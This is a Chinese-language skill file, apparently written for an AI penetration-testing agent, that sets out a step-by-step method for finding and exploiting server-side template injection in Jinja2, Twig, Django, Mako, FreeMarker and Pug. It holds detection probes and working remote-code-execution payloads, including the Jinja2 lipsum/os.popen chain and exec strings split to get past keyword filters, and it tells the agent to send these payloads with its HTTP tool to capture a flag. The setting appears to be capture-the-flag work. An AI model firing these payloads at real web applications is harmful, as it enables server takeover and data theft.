---
name: ssti-methodology
description: "服务端模板注入(SSTI)的检测、引擎识别和利用。当目标是Flask/Jinja2/Django/Twig/Mako/Pug应用、存在用户输入回显、参数名含template/name/message/greeting时使用。Phase 0/1即覆盖快速检测和引擎识别，无须单独skill。如只需快速检测定位可直接使用Phase 0/1，无需阅读完整利用部分"
metadata:
  tags: "ssti,template injection,template-injection,server-side template injection,jinja2,django,twig,mako,rce,sandbox-escape"
  category: "exploit"
---

# SSTI 服务端模板注入方法论

## ⛔ 深入参考（确认引擎后必读对应文件）

- Jinja2 完整利用链（上下文变量→文件读取→RCE）→ [references/jinja2-exploitation.md](references/jinja2-exploitation.md)
- Twig/Mako/FreeMarker/Pug/Django 利用或过滤绕过 → [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)
- 多引擎 RCE payload 速查与沙箱逃逸 → [references/multi-engine-payloads.md](references/multi-engine-payloads.md)

---

## Phase 0: 注入点定位（最先执行！）

**不要盲目在所有参数上尝试 SSTI payload！** 先定位哪些参数会被模板渲染：

1. 用 analyze_response 观察哪些参数值**出现在响应中**
2. 只有**回显到页面的参数**才可能是注入点
3. 常见回显参数：`name`, `username`, `message`, `greeting`, `template`, `title`, `q`, `search`

**陷阱**：HTML 转义的回显（`<` → `&lt;`）仍可能被模板渲染——`{{7*7}}` 可能生效。

## Phase 1: 检测模板注入（决策树）

```
Step 1: 发送 {{7*7}}
  → 返回 49 → 进入 Step 2
  → 原样返回 → 不是 Jinja2/Twig，进入 Step 3
  → 返回空/错误 → 可能有过滤，尝试 {{7*'7'}}

Step 2: 发送 {{7*'7'}}
  → 返回 7777777 → Jinja2 (Python) ★最常见
  → 返回 49 → Twig (PHP)

Step 3: 发送 ${7*7}
  → 返回 49 → Java EL / Mako / FreeMarker
Step 4: 发送 #{7*7}
  → 返回 49 → Ruby ERB 或 Pug
```

## Phase 2: 引擎识别辅助表

| 引擎 | 语言 | Server 头线索 | 确认方法 |
|------|------|-------------|---------|
| Jinja2 | Python/Flask | Werkzeug, gunicorn | `{{config}}` 有输出 |
| Django | Python | WSGIServer | `{{settings.DEBUG}}` |
| Twig | PHP | Apache+PHP | `{{_self.env.display('id')}}` |
| Mako | Python | - | `${self.module.__builtins__}` |
| FreeMarker | Java | Tomcat, Spring | `${.now}` 返回当前时间 |
| Pug/Jade | Node.js | Express | `#{7*7}` 返回 49 |

## Phase 3: 利用决策树

```
确认引擎类型
├─ Jinja2？→ [references/jinja2-exploitation.md](references/jinja2-exploitation.md)
│   优先级：上下文变量 → config → 文件读取 → RCE(lipsum链)
├─ Twig？→ [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)
├─ Mako/FreeMarker/Pug？→ [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)
├─ Django？→ [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)
│   无 RCE！优先级：上下文变量穷举 → request.META → settings → admin 路径发现
└─ 有过滤？→ [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)（过滤绕过部分）
```

**Jinja2 速查**（完整 payload → [references/jinja2-exploitation.md](references/jinja2-exploitation.md)）：
```
{{lipsum.__globals__['os'].popen('id').read()}}       # RCE 首选
{{config}}                                              # 读配置
```

## 注意事项
- **先简单后复杂**：上下文变量 → config → 文件读取 → RCE
- **URL 编码**：GET 参数注入时 `{{` `}}` 需要编码
- **错误信息**：500 页面可能泄露引擎类型和 Python 版本

## Phase 4: 高级利用技术

### 4.1 子类遍历与 Payload 构造
- 使用循环 for + enumerate 遍历子类列表
- 目标类：`os._wrap_close`、`subprocess.Popen`
- 条件过滤：`if 'popen' in str(cls)` — 字符串匹配筛选
- 不同环境索引不同，需要动态查找而非硬编码索引

### 4.2 过滤绕过技巧
- 外部传参：`?a=__class__&b=__mro__`，模板中用 `request.args.a` 引用
- 过滤只在模板内容检查，不检查 URL 参数
- 拆分 payload：注入点和数据点分离
- 关键词被过滤时，通过 `globals.__self__` 到达 builtins 模块，用字符串拼接绕过：
  ```python
  {{ globals.__self__.exec("imp" + "ort o" + "s;o" + "s.system('cat /flag')") }}
  {{ request.__class__.__init__.__globals__.__builtins__.exec("__imp"+"ort__('o'+'s').system('id')") }}
  ```

### 4.3 利用顺序
- 优先级最高：先试简单的，直接变量访问（`{{config}}`）
- 顺序：先确认后利用，先识别引擎再选 payload
- 最终：http_request 发送 RCE payload 获取 flag
